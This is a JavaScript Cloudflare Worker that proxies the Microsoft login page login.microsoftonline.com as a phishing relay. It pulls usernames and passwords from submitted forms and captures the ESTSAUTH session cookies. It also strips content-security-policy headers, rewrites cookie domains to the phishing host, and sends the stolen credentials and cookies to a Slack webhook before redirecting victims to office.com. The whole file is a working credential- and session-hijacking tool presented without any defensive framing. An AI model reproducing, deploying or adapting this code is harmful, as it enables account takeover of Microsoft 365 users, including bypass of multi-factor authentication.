const upstream = 'login.microsoftonline.com';
const upstream_path = '/';
const https = true;
const webhook = "[INSERT SLACK WEBHOOK]";

// Blocking
const blocked_region = [];
const blocked_ip_address = ['0.0.0.0', '127.0.0.1'];

addEventListener('fetch', event => {
    event.respondWith(fetchAndApply(event.request));
});

async function fetchAndApply(request) {
    const region = request.headers.get('cf-ipcountry').toUpperCase();
    const ip_address = request.headers.get('cf-connecting-ip');

    let all_cookies = "";
    let username = "";
    let password = "";
    let response = null;
    let url = new URL(request.url);
    let url_hostname = url.hostname;

    if (https) {
        url.protocol = 'https:';
    } else {
        url.protocol = 'http:';
    }

    var upstream_domain = upstream;
    url.host = upstream_domain;

    if (url.pathname === '/') {
        url.pathname = upstream_path;
    } else {
        url.pathname = upstream_path + url.pathname;
    }

    if (blocked_region.includes(region)) {
        response = new Response('Access denied.', { status: 403 });
    } else if (blocked_ip_address.includes(ip_address)) {
        response = new Response('Access denied', { status: 403 });
    } else {
        let method = request.method;
        let request_headers = request.headers;
        let new_request_headers = new Headers(request_headers);

        new_request_headers.set('Host', upstream_domain);
        new_request_headers.set('Referer', url.protocol + '//' + url_hostname);

        // Obtain information from POST body
        let message = "";
        if (request.method === 'POST') {
            const temp_req = await request.clone();
            const body = await temp_req.text();
            const keyValuePairs = body.split('&');

            // Iterate over the key-value pairs to find relevant information
            for (const pair of keyValuePairs) {
                const [key, value] = pair.split('=');

                if (key === 'login') {
                    // Decode the URL-encoded value for the username
                    username = decodeURIComponent(value.replace(/\+/g, ' '));
                    console.log(`Username found: ${username}`);
                    message += `User: ${username}\n`;
                }
                if (key === 'passwd') {
                    // Decode the URL-encoded value for the password
                    password = decodeURIComponent(value.replace(/\+/g, ' '));
                    console.log(`Password found: ${password}`);
                    message += `Password: ${password}\n`;
                }
            }
        }

        let original_response = await fetch(url.href, {
            method: method,
            headers: new_request_headers,
            body: request.body
        });

        let connection_upgrade = new_request_headers.get("Upgrade");
        if (connection_upgrade && connection_upgrade.toLowerCase() === "websocket") {
            return original_response;
        }

        let original_response_clone = original_response.clone();
        let response_headers = original_response.headers;
        let new_response_headers = new Headers(response_headers);
        let status = original_response.status;

        new_response_headers.set('access-control-allow-origin', '*');
        new_response_headers.set('access-control-allow-credentials', true);
        new_response_headers.delete('content-security-policy');
        new_response_headers.delete('content-security-policy-report-only');
        new_response_headers.delete('clear-site-data');

        // Replace cookie domains
        try {
            // Get all the Set-Cookie headers
            const originalCookies = new_response_headers.getAll("Set-Cookie");
            all_cookies = originalCookies.join("; \n\n");

            // Iterate through each original cookie
            originalCookies.forEach(originalCookie => {
                // Replace the value in each cookie
                const modifiedCookie = originalCookie.replace(/login\.microsoftonline\.com/g, url_hostname);

                // Set the modified Set-Cookie header individually
                new_response_headers.append("Set-Cookie", modifiedCookie);
            });
        } catch (error) {
            // Handle errors
            console.error(error);
        }

        const content_type = new_response_headers.get('content-type');

        let original_text = await replace_response_text(original_response_clone, upstream_domain, url_hostname);

        if (all_cookies.includes('ESTSAUTH') && all_cookies.includes('ESTSAUTHPERSISTENT')) {
            if (username) {
                message += `Cookies found for user ${username}:\n\n${all_cookies}`;
            } else {
                message += `Cookies found:\n\n${all_cookies}`;
            }
        }

        if (message) {
            await slack(message, webhook);
        }

        // Redirect to the desired URL
        response = new Response(null, {
            status: 302,
            headers: {
                'Location': 'https://www.office.com/?auth=1'
            }
        });
    }
    return response;
}

async function replace_response_text(response, upstream_domain, host_name) {
    let text = await response.text();
    let re = new RegExp('login.microsoftonline.com', 'g');
    text = text.replace(re, host_name);
    return text;
}

async function slack(message, webhook) {
    const payload = {
        text: message
    };

    try {
        const response = await fetch(webhook, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });

        if (!response.ok) {
            const errorText = await response.text();
            console.error('Slack webhook response error:', errorText);
            throw new Error('Failed to send message to Slack');
        }

        return new Response('Message sent to Slack successfully', { status: 200 });
    } catch (error) {
        console.error('Slack webhook error:', error);
        return new Response(`Error: ${error.message}`, { status: 500 });
    }
}
